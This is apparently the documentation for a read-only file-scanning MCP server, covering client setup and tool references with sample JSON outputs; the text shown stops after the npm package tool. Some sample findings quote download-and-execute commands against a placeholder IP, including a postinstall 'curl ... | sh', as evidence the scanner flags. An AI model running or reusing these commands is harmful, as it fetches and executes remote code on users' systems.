# MCP Server Guide

`file-scanner` can run as an [MCP](https://modelcontextprotocol.io) server. An AI client such as Claude Code,
Claude Desktop, Cursor or VS Code then calls its tools to look at files on your machine: executables, scripts,
documents, archives, Java archives and npm or Python packages. The scanner reads files and never runs them.

The server has 17 tools. They are built to be used in this order: an overview first, then a targeted question,
then a paged drill-down. Full analysis runs are cached, so the follow-up questions are cheap.

## Contents

- [Quick start](#quick-start)
- [Client setup](#client-setup)
- [How to use the tools](#how-to-use-the-tools)
- [Tool reference](#tool-reference)
- [Worked examples](#worked-examples)
- [Transports and security](#transports-and-security)
- [The cache](#the-cache)
- [Limits](#limits)
- [Troubleshooting](#troubleshooting)

## Quick start

Install the binary (see [INSTALLATION.md](INSTALLATION.md)); `cargo install threatflux-file-scanner --locked`
(crates.io may not list a release yet; if the install fails, build from source or use GitHub Releases)
puts it at `~/.cargo/bin/file-scanner`. Then pick a transport.

### stdio (recommended)

The client starts the server as a child process and talks to it over stdin and stdout. Nothing listens on a port.

```bash
file-scanner mcp-stdio
```

Add `--allow-root <dir>` (repeatable) to limit which directories the tools may read:

```bash
file-scanner mcp-stdio --allow-root ~/samples --allow-root /tmp/incoming
```

### HTTP

```bash
file-scanner mcp-http --port 3000
```

The MCP endpoint is `http://127.0.0.1:3000/mcp` (Streamable HTTP). Use `--port 0` to let the system pick a free
port; the startup banner on stderr prints the one it got.

### Security defaults

| Default | What it means |
| --- | --- |
| Binds `127.0.0.1` | Only this machine can connect. Use `--host 0.0.0.0` to change that. |
| `Host` header check | Only `localhost`, `127.0.0.1`, `::1` and any `--allowed-host` are accepted. |
| `Origin` header check | A browser `Origin` must be a loopback origin or an `--allowed-origin`, else 403. |
| No CORS wildcard | Preflights are answered for allowed origins only. |
| No token | Anyone who can reach the port can call the tools. Set `--auth-token` before you expose it. |
| No path limit | Tools can read any file the server's user can read. Set `--allow-root` to confine them. |

The tools return file contents (strings, hex dumps), so an exposed server is a file-reading service. If you
publish the port, always set `--auth-token` and `--allow-root`, and put a TLS-terminating proxy in front. The
server itself speaks plain HTTP. Details are in [Transports and security](#transports-and-security).

## Client setup

Use the absolute path of the binary in every client config. GUI clients often start with a different `PATH` than
your shell, so a bare `file-scanner` may not be found. Find the path with `command -v file-scanner`.
`cargo install` puts the binary at `~/.cargo/bin/file-scanner`; replace `~` with your home directory in JSON files,
which do not expand it.

### Claude Code

Add a stdio server:

```bash
claude mcp add file-scanner -- /absolute/path/to/file-scanner mcp-stdio
```

Everything after `--` is the command line. By default the server is stored for you in the current project (scope
`local`). Use `--scope user` to make it available in all your projects, or `--scope project` to write a
`.mcp.json` at the project root that you can commit:

```bash
claude mcp add --scope user file-scanner -- /absolute/path/to/file-scanner mcp-stdio
claude mcp add --scope project file-scanner -- /absolute/path/to/file-scanner mcp-stdio \
  --allow-root /absolute/path/to/samples
```

The `.mcp.json` form of the same entry:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio", "--allow-root", "/absolute/path/to/samples"]
    }
  }
}
```

To connect to a running HTTP server instead:

```bash
claude mcp add --transport http file-scanner http://127.0.0.1:3000/mcp
```

If the server has a token, pass it as a header:

```bash
claude mcp add --transport http file-scanner http://127.0.0.1:3000/mcp \
  --header "Authorization: Bearer $FILE_SCANNER_AUTH_TOKEN"
```

Check the result with `claude mcp list`, or run `/mcp` inside Claude Code.

### Claude Desktop

Claude Desktop reads `claude_desktop_config.json`:

| OS | Location |
| --- | --- |
| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |
| Linux | `~/.config/Claude/claude_desktop_config.json` |

Add the server under `mcpServers`, then quit and reopen Claude Desktop:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio"]
    }
  }
}
```

On Windows write the path with escaped backslashes or forward slashes, for example
`"C:/Users/you/.cargo/bin/file-scanner.exe"`.

### Cursor

Cursor reads `.cursor/mcp.json` in a project, or `~/.cursor/mcp.json` for all projects. The top-level key is
`mcpServers`:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio"]
    }
  }
}
```

### VS Code

VS Code reads `.vscode/mcp.json` in a workspace. The top-level key here is `servers`, not `mcpServers`:

```json
{
  "servers": {
    "file-scanner": {
      "type": "stdio",
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio"]
    }
  }
}
```

### Docker

Tool calls resolve paths on the server's own file system. A container only sees what you mount, so mount the files
at the same path inside the container as on the host. Then the paths a client sends are valid in both places.

```bash
claude mcp add file-scanner -- docker run -i --rm \
  -v "$PWD:$PWD:ro" -w "$PWD" ghcr.io/threatflux/file-scanner:latest mcp-stdio
```

The JSON equivalent for other clients:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "docker",
      "args": ["run", "-i", "--rm", "-v", "/absolute/samples:/absolute/samples:ro",
               "-w", "/absolute/samples",
               "ghcr.io/threatflux/file-scanner:latest", "mcp-stdio"]
    }
  }
}
```

Notes:

- Use `-i` (keep stdin open) and no `-t`. The client speaks JSON-RPC over stdin and stdout.
- Only mounted paths can be scanned. The image runs as user 65532, so mounted files must be readable by it.
- Inside the container the cache goes to a per-user directory under the temp directory; with a read-only mount or file
  system, pass `--no-cache` or `--cache-dir` to a writable path.
- The image's entry point is the scanner itself, so always give the subcommand (`mcp-stdio` or `mcp-http`).
- For HTTP in a container the server must listen on all container interfaces, and the published port should stay
  on the host's loopback unless you add a token:

  ```bash
  docker run --rm -p 127.0.0.1:3000:3000 -v "$PWD:/data:ro" ghcr.io/threatflux/file-scanner:latest \
    mcp-http --host 0.0.0.0 --port 3000 --allow-root /data --auth-token "$TOKEN"
  ```

  Clients then send `/data/...` paths, and must send the token as `Authorization: Bearer <token>`.

## How to use the tools

### The workflow

1. **Overview.** Call `analyze_file` with only `file_path`. You get type, hashes, headline facts, the most telling
   strings and a `next_steps` list that names the next call. It never runs the heavy analyses. For a directory it
   returns one triage row per file.
2. **One section.** Ask for a named section: `analyze_file` with `sections: ["symbols", "vulnerabilities"]`. Each
   section is computed in full, cached by the file's SHA-256 and returned as a short summary.
3. **Read the items.** `query_analysis` pages and filters the lists inside a section (strings, imports,
   functions, findings). Then use `disassemble` for one function's machine code and `read_hex` for raw bytes.
4. **Compare and search.** `compare_files` for two files; `search_strings` and `string_details` to hunt a string
   across files.
5. **Specialist tools** by file kind: `analyze_document` (PDF, Office), `analyze_script`, `inspect_archive`,
   `analyze_java_file`, `analyze_npm_package`, `analyze_python_package`. The overview names the right one.
6. **Detection.** `llm_analyze_file` gives a compact digest and a draft YARA rule. `yara_scan_file` tests a rule.
7. **Housekeeping.** `cache_status` shows what is cached. `cache_clear` forgets it.

### `all: true`

`analyze_file` with `all: true` runs every analysis once, stores each full section in the cache, and returns only
per-section summaries. The later `query_analysis`, `disassemble` and `read_hex` calls on that file are answered from
the cache. It still costs analysis time on a large binary, so use it when you plan to ask several follow-up
questions. For a quick look, the overview is enough.

### Output size and the byte budget

Clients limit how much tool output they will inline: Claude Code warns above 10,000 tokens and caps MCP output at
25,000 tokens by default. The server therefore bounds every answer.

- Every tool takes `max_output_bytes` (default 80,000, minimum 4,000, ceiling 400,000). The answer never exceeds it.
- Anything that did not fit is named under `truncated`.
- Lists come back in pages (see below), so a large list is never sent whole.

Real sizes, in characters of the default answer (debug build, test programs from this repository):

| Call | 22 KB ELF | 3.8 MB ELF | 8.3 MB ELF |
| --- | --- | --- | --- |
| `analyze_file` (overview) | 3,117 | 4,259 | 3,806 |
| `analyze_file` with `all: true` | 25,567 | 30,983 | 33,495 |
| `llm_analyze_file` | 2,627 | 5,257 | 4,570 |

`hex_dump` and `strings` through `analyze_file` return summaries and short samples. To read the actual lists use
`query_analysis`; to read bytes use `read_hex`.

### Paging

Every list answer has the same fields:

| Field | Meaning |
| --- | --- |
| `total` | How many rows match (after any filter). |
| `returned` | How many rows are in this answer. |
| `offset` | The row this page started at. |
| `next_offset` | Pass this as `offset` to get the next page. Absent on the last page. |

If the byte budget cuts a page, `returned` and `next_offset` describe the rows actually sent, so following
`next_offset` loses nothing:

```json
{
  "items": [ ... 47 rows ... ],
  "total": 54687,
  "returned": 47,
  "offset": 0,
  "next_offset": 47,
  "hint": "The page was cut to 47 of the 500 rows asked for to fit max_output_bytes; repeat the call with offset 47 ...",
  "cache": "hit"
}
```

### `cache: hit | miss`

Most answers say where they came from. `hit` means a stored result was used; `miss` means the analysis ran now and
was stored. `partial` (analysis sections) means some of the requested sections were stored and some were computed.
Under `--no-cache` nothing is stored and every call recomputes.

### Errors

A tool that cannot do what was asked returns a normal result with `isError: true` and a message that says what to
fix. It is not a protocol error, so the client can show it to the model and the model can retry:

```json
{ "content": [ { "type": "text", "text": "File does not exist: /nonexistent/file" } ], "isError": true }
```

Examples of messages: a path outside `--allow-root` names the allowed directories; an offset past the end of a file
gives the file size; a YARA rule that does not compile carries the compiler's message, line and column; a registry
name given to a package tool says the tool is offline and how to get the package locally; an unknown argument lists
the valid ones. Calling a tool that does not exist is a JSON-RPC `-32602` error.

### Paths

Pass absolute paths. A leading `~/` is expanded. Symbolic links are resolved. FIFOs, sockets and device files are
refused. With `--allow-root`, every path must resolve (symlinks and `..` included) to a place under one of the roots.

### Testing by hand

stdio messages are one JSON object per line. Do not pretty-print a request; each line is parsed on its own. This
one-line session lists the tools:

```bash
INIT='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18",'
INIT+='"capabilities":{},"clientInfo":{"name":"test","version":"1"}}}'
printf '%s\n' "$INIT" \
  '{"jsonrpc":"2.0","method":"notifications/initialized"}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/list"}' \
  | file-scanner mcp-stdio 2>/dev/null | jq -c '{id, tools: (.result.tools // [] | length)}'
```

```text
{"id":1,"tools":0}
{"id":2,"tools":17}
```

The `initialize` reply carries the server's instructions; the second reply lists all 17 tools. The server writes
only JSON-RPC to stdout; the banner goes to stderr.

## Tool reference

Arguments marked `*` are required. Every tool also accepts `max_output_bytes` (default 80,000; values outside 4,000 to 400,000 are clamped, not rejected).
Paged tools accept `offset` (default 0) and `limit` (default 50, at most 500 unless stated). Unknown arguments are
rejected. All tools are read-only except `cache_clear`. Examples are shortened and use `/samples/...` for paths.

### analyze_file

Start here. Triage overview of a file or directory.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path of a file, or of a directory (triage table). |
| `sections` | Names to run (listed below the table). |
| `all` | Run every section; return summaries only. |
| Boolean flags | The same section names as flags (`symbols: true`) are accepted too. |
| `min_string_length` | Shortest string to count (default 4, at most 4,096). |
| `hex_dump`, `hex_dump_size`, `hex_dump_offset` | Default 256 bytes, at most 4,096; negative offset: from end. |
| `arch` | Slice of a universal Mach-O (`arm64`, `x86_64`, ...). |
| `recursive`, `max_files` | Directory only: descend; most files listed (default 1,000, ceiling 10,000). |
| `offset`, `limit` | Directory only: page of the triage table (limit at most 200). |

Section names: `metadata`, `hashes`, `strings`, `hex_dump`, `binary_info`, `signatures`, `symbols`, `control_flow`,
`vulnerabilities`, `code_quality`, `dependencies`, `entropy`, `disassembly`, `call_graph`, `threats`,
`enhanced_threats`, `behavioral`, `taint`, `yara_indicators`.

With no section named, the answer is the overview:

```json
{
  "view": "overview",
  "file_path": "/samples/test_programs/c_advanced_binary",
  "size": 22088,
  "sha256": "91f09b18aceb91cbcdbf35e98b9ffb21bd91746abdcb00d95c17abd901cad3f0",
  "type": "ELF 64-bit shared object or PIE executable (x86-64)",
  "kind": "elf",
  "format": { "format": "ELF", "architecture": "x86_64", "compiler": "GCC/GNU", "is_stripped": false, ... },
  "signature": { "is_signed": false, "verification_status": "No signature found" },
  "entropy": { "overall": 3.37, "likely_packed": false, "likely_encrypted": false, ... },
  "interesting_strings": [
    { "category": "IP Address", "value": "127.0.0.1", "offset": 12327 },
    { "category": "File Path", "value": "/proc/self/status", "offset": 12298 },
    { "category": "Debug Info", "value": "ptrace", "offset": 2046 }, ...
  ],
  "counts": { "strings": 189, "functions": 57, "imported_symbols": 35, "exported_symbols": 18 },
  "available_sections": ["metadata", "hashes", "strings", ...],
  "not_applicable": { "taint": "applies to UTF-8 source or script text only, not to this kind of file" },
  "next_steps": [
    { "tool": "query_analysis",
      "arguments": { "file_path": "...", "section": "strings", "category": "IP Address" },
      "gives": "page and filter every string (filter, category, encoding, offset, limit)" }, ...
  ],
  "cache": "miss"
}
```

With sections or `all: true`, each section comes back as a summary (counts, headline numbers, a few top items) at the
top level, plus `errors` (sections that failed), `notes` (sections that do not apply, with the reason), `next_steps`
and `cache`. `all: true` on that file is 25,567 characters. For a directory the answer is `view: "directory"` with a
paged `files` table (path, size, type, kind, sha256, entropy, `flags`), `total`, `next_offset`, and
`not_entered` when subdirectories were skipped.

Limits: a file over 256 MiB gets an overview without the whole-file sections (the answer says what was skipped and
the call that runs it). A directory walk stops after 200,000 entries or 10 seconds. The overview names the specialist
tool for the file's kind (`analyze_document`, `analyze_script`, `inspect_archive`, `analyze_java_file`,
`analyze_npm_package`, `analyze_python_package`).

### query_analysis

Page and filter the lists inside one section of a file. Runs the section if it is not cached.

| Argument | Notes |
| --- | --- |
| `file_path`*, `section`* | One of the sections above except `hashes`, `metadata`, `hex_dump`, `signatures`. |
| `list` | List inside the section; default is its main list. The answer names `available_lists`. |
| `filter` | Case-insensitive substring; with `regex: true`, a regular expression. |
| `category` | Strings: `URL`, `IP Address`, `Email`, ... Vulnerabilities: category or severity. |
| `encoding` | Strings only: `ascii`, `utf16le` or `utf16be`. |
| `min_string_length` | Strings only (default 4, at most 4,096). |
| `detail` | Return raw rows instead of compact ones. |
| `arch` | Universal Mach-O slice. |

Lists by section: `strings`; `binary_info` (sections, imports, exports); `symbols` (functions, imports, exports,
global_variables, cross_references); `control_flow` (functions); `vulnerabilities`; `code_quality` (functions,
quality_issues); `dependencies` (dependencies, compliance_issues); `entropy` (sections, high_entropy_regions);
`disassembly` (functions, instructions, suspicious_patterns); `call_graph` (functions, edges,
unreachable_functions); `taint` (flows, vulnerabilities, sources, sinks, sanitizers); `threats` and
`enhanced_threats` (matches, indicators); `behavioral` (findings, plus each group); `yara_indicators`.

```json
{
  "items": [ { "offset": 12327, "encoding": "ascii", "value": "127.0.0.1", "category": "IP Address" } ],
  "total": 1, "returned": 1, "offset": 0,
  "section": "strings", "list": "strings", "unfiltered_total": 189,
  "applied": { "category": "IP Address" },
  "available_lists": ["strings"],
  "cache": "hit"
}
```

Limits: for a file with more strings than the stored list holds (50,000 plain and 50,000 categorized), an unfiltered
page says so, and a `filter`, `category` or `encoding` scans the whole file again for the matches.

### disassemble

Machine code of one function or address range of an ELF or thin Mach-O binary, as a text listing. Never the whole
binary.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `function` | Function name (exact, else a unique case-insensitive match) or its address. |
| `address` | `"0x401136"` or a number: the function containing it is listed from there. |
| `arch` | Accepted, but ignored by this tool: a universal Mach-O is disassembled on one slice. |
| `max_instructions` | Default 200, at most 1,000. |
| `filter`, `offset`, `limit` | With neither `function` nor `address`: page through the function list. |

With neither `function` nor `address` it lists functions:

```json
{
  "view": "functions",
  "items": [
    { "name": "_start", "address": "0x1460", "size": 38, "instructions": 13, "complexity": 2 },
    { "name": "deregister_tm_clones", "address": "0x1490", "size": 48, "instructions": 11, "complexity": 3 }, ...
  ],
  "total": 20, "returned": 3, "offset": 0, "next_offset": 3,
  "architecture": "x86_64", "total_instructions": 773, "decoded_range": "0x1460..0x20c9", "cache": "hit"
}
```

With `function: "main", max_instructions: 5`:

```json
{
  "view": "listing",
  "function": { "name": "main", "address": "0x1d49", "size": 897, "complexity": 16, "instructions": 210 },
  "listing": "0x1d49  f3 0f 1e fa              endbr64\n0x1d4d  55                       push rbp\n ...",
  "returned": 5, "more": true, "remaining": 205, "next_address": "0x1d58", "cache": "hit"
}
```

Limits: a universal (fat) Mach-O is disassembled on one slice (the host's, arm64e on Apple silicon); `arch` does not
select another slice for this tool. A bounded part of the disassembly is cached; an
address outside it is decoded again for the call, which takes a moment on a large file.

### read_hex

Raw bytes as a hex dump.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `offset` | Start (default 0). Negative counts from the end: `-64` is the last 64 bytes. |
| `length` | Default 256, at most 4,096. |

```json
{
  "file_path": "/samples/test_programs/c_advanced_binary",
  "offset": 0, "length": 32, "total_bytes": 22088, "end_of_file": false,
  "lines": [ "00000000  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  |.ELF............|", ... ],
  "next_offset": 32
}
```

An offset at or past the end of the file is an error that gives the file size.

### compare_files

Are two files the same, and what do they share? It does not diff bytes or code.

| Argument | Notes |
| --- | --- |
| `file_a`*, `file_b`* | Absolute paths. |
| `max_items` | Items listed per group (default 20, at most 200). |

```json
{
  "identical": false,
  "file_a": { "size": 22088, "format": "ELF", "architecture": "x86_64", "entropy": 3.37, ... },
  "file_b": { "size": 41168, "format": "ELF", "architecture": "x86_64", "entropy": 4.89, ... },
  "size_delta": 19080, "entropy_delta": 1.526, "same_format": true,
  "imports": { "a": 38, "b": 54, "common": 12, "only_in_a": 26, "only_in_b": 42, "similarity": 0.15,
               "common_items": ["__cxa_finalize", ...], "lists_capped": "each list shows at most 3 items ..." },
  "sections": { ... }, "categorized_strings": { ... },
  "next_steps": [ ... ]
}
```

Identical SHA-256 returns a short `{"identical": true}`.

### search_strings

Search the strings of one file, or of every file indexed in this session. At least one of `query`, `regex`,
`category`, `min_entropy` or `suspicious_only` is required: the tool never lists every string.

| Argument | Notes |
| --- | --- |
| `query` | Case-insensitive substring. |
| `regex` | Regular expression (Rust syntax). |
| `file_path` | One file. Omit to search every string indexed this session. |
| `category` | For example `network`, `command`, `execution`, `crypto`, `path`, `credential`. |
| `min_entropy`, `suspicious_only` | Entropy floor; only strings flagged suspicious. |
| `min_length` | With `file_path`: shortest string to extract (2 to 256, default 4). |

With `file_path` the answer is `scope: "file"` and lists each match with its offsets:

```json
{
  "scope": "file", "file_path": "/samples/test_programs/c_advanced_binary", "cache": "miss",
  "strings_in_file": 189, "scanned_bytes": 22088,
  "items": [ { "value": "ptrace", "offset": 2046, "offsets": [2046], "count": 1, "encoding": "ascii",
               "categories": ["file_string", "generic"], "entropy": 2.58, "suspicious": false }, ... ],
  "total": 2, "returned": 2, "offset": 0
}
```

Without it, `scope: "session"`: each item has `total_occurrences`, `files_total` and up to 5 `files`. Strings are
indexed by `analyze_file` with strings and by this tool; files you have not touched are not searched.
Limits: indexing a file stops at 200,000 strings or 32 MiB of text, and says so.

### string_details

Everything known about one exact string: files, offsets, categories, entropy and related strings.

| Argument | Notes |
| --- | --- |
| `value`* | The string as `search_strings` returned it (a unique prefix of a cut value also works). |
| `related_limit` | Related strings to list (default 10, at most 50). |
| `offset`, `limit` | Page of files. |

```json
{
  "value": "Debugger detected!", "total_occurrences": 3, "files_total": 3,
  "files": [ { "file_path": "/samples/test_programs/c_advanced_binary", "file_hash": "91f09b...",
               "occurrences": 1, "offsets": [12682] }, ... ],
  "categories": ["file_string", "generic"], "entropy": 3.19, "suspicious": false,
  "related": [ { "value": "__GNU_EH_FRAME_HDR", "score": 0.75 }, ... ]
}
```

A value that was never tracked is an error that says how to get it tracked.

### llm_analyze_file

A small, fixed-size digest of one file for writing a detection rule. Choose it over `analyze_file` when you want a
YARA rule or one answer that fits a small context; use `analyze_file` to investigate what a file does.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `token_limit` | Output budget in characters of compact JSON (about 4 per token, default 25,000). |
| `min_string_length` | At least 1 (default 6). |
| `max_strings`, `max_imports`, `max_opcodes` | Defaults 50, 30, 10. |
| `hex_pattern_size` | Bytes per header and footer pattern, 1 to 1,024 (default 32). |
| `suggest_yara_rule` | Default true. |

```json
{
  "sha256": "91f09b18...", "md5": "5ad5e32b...", "file_size": 22088,
  "file_type": "ELF 64-bit shared object or PIE executable (x86-64)", "architecture": "x86_64", "is_packed": false,
  "key_strings": ["127.0.0.1", "/proc/self/status", "TracerPid:", "Debugger detected!", "msftupdater.com", ...],
  "hex_patterns": ["7F 45 4C 46 02 01 01 00 ...", ...],
  "imports": ["getenv", "strcpy", "ptrace", "connect", ...],
  "opcodes": ["F3 0F 1E FA", "31 ED", ...],
  "entropy": 3.37,
  "yara_rule_suggestion": "rule c_advanced_binary { ... condition: filesize == 22088 and 3 of ($s*) and $header at 0 }"
}
```

The draft rule is a starting point. It is tied to this one file (note the `filesize` condition); edit it before you
use it on other samples. If the digest does not fit `token_limit`, what was cut is listed under `truncated`. If no
rule could be built, `yara_rule_note` says why.

### yara_scan_file

Scan a file or directory with YARA rules (YARA-X).

| Argument | Notes |
| --- | --- |
| `path`* | Absolute path of a file or directory. |
| `yara_rule` | Rule text, or the word `builtin` for the scanner's own 10 rules (max 5 MB of text). |
| `rule_path` | A `.yar`/`.yara` file, or a directory of them (max 20 MiB). `include` is not supported. |
| `recursive` | Default true. |
| `max_file_size` | Bytes; default and ceiling 100 MB. Larger files are listed under `skipped`. |
| `detailed_matches` | List matched strings (default true). |
| `max_matches_per_rule` | Default 10, at most 1,000. `strings_total` has the full count. |
| `max_rules_per_file` | Default 100, at most 1,000. |
| `max_files` | Default 10,000, at most 100,000. |
| `timeout_seconds` | Default 60, at most 600. |
| `offset`, `limit` | Page of matching files (default 50). |

One of `yara_rule` and `rule_path` is required. A call without `offset` always scans anew; later pages are served
from that scan's kept result for 10 minutes (`cache: "hit"`).

```json
{
  "total_files_scanned": 25, "total_matches": 2, "files_matched": 2, "rules_compiled": 1,
  "rule_hits": [ { "rule": "beacon_dropper", "files": 2 } ],
  "matches": [
    { "file_path": "/samples/test_programs/c_advanced_binary", "file_size": 22088,
      "matches": [ { "rule_identifier": "beacon_dropper", "tags": [], "metadata": {},
                     "strings": [ { "identifier": "$a", "offset": 12337, "length": 15, "value": "msftupdater.com" },
                                  { "identifier": "$b", "offset": 12360, "length": 20, ... } ],
                     "strings_total": 2 } ],
      "rules_total": 1 }, ... ],
  "errors": [], "skipped": [], "files_not_scanned": 0, "timed_out": false, "limits_reached": [],
  "matches_total": 2, "matches_returned": 2, "matches_offset": 0, "cache": "miss"
}
```

A rule that does not compile is an error with the compiler's message, line and column:

```text
Failed to compile YARA rule (yara_rule): error[E025]: unknown pattern `$b`
 --> yara_rule:1:41
```

Limits: whatever was cut is named under `limits_reached`. The server checks every entry under `path` against
`--allow-root` before the scan starts, and `timeout_seconds` does not cover that check.

### analyze_document

PDF and Microsoft Office files (`.doc`, `.xls`, `.ppt`, `.docx`, `.docm`, `.xlsm`, `.pptm`). The type is detected from
the first bytes.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `category` | PDF: see list below. Office: `auto_exec`, `keyword`, `network`, `modules`. |
| `module` | Office only: one VBA module's source lines (paged) instead of findings. |

PDF categories: `action`, `script`, `link`, `launch`, `submit`, `attachment`, `evasion`, `encryption`.

```json
{
  "cache": "miss",
  "summary": {
    "format": "pdf", "version": "1.4", "pages": 1, "objects": 4, "encrypted": false, "open_action_type": "action",
    "risk": { "level": "critical", "score": 65,
              "reasons": ["JavaScript present (1 reference(s))", "OpenAction runs when the document opens", ...] },
    "feature_counts": { "JS": 1, "JavaScript": 1, "OpenAction": 1 },
    "next_steps": ["analyze_document {file_path, category: \"script\"} shows the JavaScript", ...]
  },
  "findings": { "items": [ { "category": "action", "name": "JS", "severity": "high", "count": 1,
                             "evidence": [ { "offset": 203, "object": 4, "in_stream": false } ] }, ... ],
                "total": 4, "returned": 2, "offset": 0, "next_offset": 2 }
}
```

Office files report whether a VBA project exists, its modules, auto-execute entry points and suspicious keywords with
module and line. Limits: module count, bytes read and decompressed, and keyword hits are capped, and the summary says
so; a file that could not be read in full is never rated low. A file that is neither PDF nor Office gives an error
that names the right tool.

### analyze_script

One script file: shell, PowerShell, JavaScript, Python, batch or VBScript.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `language` | Force `shell`, `powershell`, `javascript`, `python`, `batch` or `vbscript`. Default: detect. |
| `category` | One finding category (listed below the table). |
| `min_severity` | `low`, `medium`, `high` or `critical`. |

Categories: `download_execute`, `dynamic_execution`, `encoded_payload`, `persistence`, `credential_access`,
`defense_evasion`, `remote_shell`, `command_execution`, `obfuscation`, `privilege_escalation`.

```json
{
  "cache": "miss",
  "summary": { "language": "Shell", "line_count": 4, "detected_by": "shebang",
               "risk": { "level": "high", "score": 40 }, "findings_total": 2,
               "category_counts": { "download_execute": 1, "persistence": 1 } },
  "findings": { "items": [
    { "category": "download_execute", "rule": "download_then_run", "severity": "high", "line": 3,
      "matched": "curl -fsSL http://203.0.113.7/stage2 -o /tmp/.u && chmod +x",
      "description": "downloads a file and then makes it executable or runs it" },
    { "category": "persistence", "rule": "cron", "severity": "high", "line": 4, "matched": "crontab", ... } ],
    "total": 2, "returned": 2, "offset": 0 }
}
```

An unknown language, category or severity, binary input, or an undetectable language is an error. For a package
use the package tools; for a binary use `analyze_file`.

### inspect_archive

List the entries of an archive without extracting it: `.zip` (and `.jar`, `.apk`, `.docx` and other ZIP-based files),
`.tar`, `.tar.gz`/`.tgz`, `.rar` (4 and 5) and `.7z`.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `filter` | Case-insensitive text in the entry path. |
| `risky_only` | Only entries with a medium or higher risk indicator. |

```json
{
  "sha256": "af7c99fe...", "cache": "miss",
  "summary": { "format": "gzip-compressed tar archive (.tar.gz)", "entries": 3, "listed_entries": 3,
               "uncompressed_bytes": 58, "encrypted": false, "risk": "critical", "risk_score": 100,
               "possible_bomb": false, "unsafe_paths": 1, "nested_archives": 0, "notes": [],
               "unsafe_path_examples": [ { "entry_path": "../../etc/cron.d/job", ... } ] },
  "entries": { "items": [
    { "path": "../../etc/cron.d/job", "kind": "file", "size": 21, "mode": "0644",
      "risks": ["PathTraversal (critical): Entry path escapes the extraction directory: ..."] },
    { "path": "invoice.pdf.exe", "kind": "file", "size": 32,
      "risks": ["Executable (medium): ...", "DoubleExtension (high): ..."] } ],
    "total": 2, "returned": 2, "offset": 0 },
  "risky_only": true
}
```

Risk flags: path traversal, links leaving the extraction root, device nodes, setuid bits, executables, double
extensions, possible compression bombs. The listing is cached by SHA-256, so paging does not parse the archive again.
Limits: encrypted or compressed RAR and 7z headers cannot be listed; `.tar.bz2` and `.tar.xz` are recognized but not
listed. When a listing is unavailable, partial or capped, counts are `null` and the risk is `unknown`, not `low`.

### analyze_java_file

A Java archive (JAR, WAR, EAR, AAR, APK) or a class file, decided from the content and not the extension.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `view` | `summary` (default), `classes`, `findings`, `resources`, `class`, `manifest`, `android`, `nested`. |
| `class` | Class name for `view: "class"` (dots or slashes). |
| `filter` | Substring: class, container or API; path; attribute; kind or name; archive path. |

```json
{
  "view": "summary", "archive_type": "Jar",
  "counts": { "entries": 2, "classes": 1, "resources": 2, "nested_archives": 0, "dex_files": 0 },
  "java_versions": { "Java 8 (major 52)": 1 },
  "manifest": { "main_class": "app.Loader", "class_path": [], ... },
  "signing": { "status": "no signature files found", "files": [] },
  "security": {
    "threat_level": "High",
    "basis": ["process_exec APIs referenced (1 class reference(s))",
              "deserialization APIs referenced (1 class reference(s))"],
    "top_findings": [
      { "category": "process_exec", "api": "java.lang.Runtime.exec", "severity": "High", "classes": 1,
        "example_classes": ["app.Loader"] }, ... ] },
  "next_steps": [ { "tool": "analyze_java_file", "arguments": { "file_path": "...", "view": "findings" } }, ... ],
  "cache": "miss"
}
```

Dangerous APIs (process execution, reflection, class and native loading, network, crypto, deserialization, JNDI,
scripting, `Unsafe`) are read from the class constant pool. Nested archives are opened one level deep within byte
caps. Not done: signatures are listed as "present, not verified"; `classes.dex` is not parsed, so APK code is not
assessed; there is no vulnerable-library (CVE) check.

### analyze_npm_package

Vet a local npm package. The tool is offline: it never downloads anything.

| Argument | Notes |
| --- | --- |
| `package_path`* | A `.tgz`/`.tar.gz` (from `npm pack`), a package directory, `package.json` or `package-lock.json`. |
| `section` | `summary` (default), `findings`, `files`, `dependencies`, `scripts`. |
| `query` | Substring filter on a finding, file or dependency name. |
| `min_severity` | `findings` only: `Critical`, `High`, `Medium` or `Low`. |
| `only_flagged` | `files` or `dependencies` only: just those with findings or advisories. |

```json
{
  "package": { "name": "left-pad-utils", "version": "1.0.3" },
  "input": { "kind": "tarball", "manifest": "package/package.json", "files_total": 2, "files_scanned": 1, ... },
  "risk": { "level": "Critical", "score": 100.0,
            "reasons": ["an install-time script runs suspicious code: Download piped to a shell or interpreter ...",
                        "1 known vulnerability(ies) in dependencies (0 critical, 1 high)", ...] },
  "findings": { "total": 4, "by_severity": { "critical": 1, "high": 2, "medium": 1, "low": 0 },
    "top": [
      { "rule": "Download piped to a shell or interpreter", "severity": "Critical",
        "file": "package/package.json#scripts.postinstall", "line": 1,
        "evidence": "curl -s http://203.0.113.7/p.sh | sh" },
      { "rule": "Eval of decoded payload", "severity": "High", "file": "package/index.js", "line": 3, ... }, ... ] },
  "install_scripts": { "has_postinstall_script": true, "hooks": ["postinstall"], "dangerous_commands": 1 },
  "dependencies": { "direct": 1, "with_advisories": 1, "vulnerable": ["lodash"], ... },
  "advisory_data": { "source": "small built-in table compiled into file-scanner; nothing is fetched",
                     "last_updated": "2025-01-06", "newest_advisory": "2022-03-16", "package_count": 6,
                     "offline": true, "coverage_note": "An empty vulnerability list means ... not in this table ..." },
  "next_steps": [ ... ], "cache": "miss"
}
```

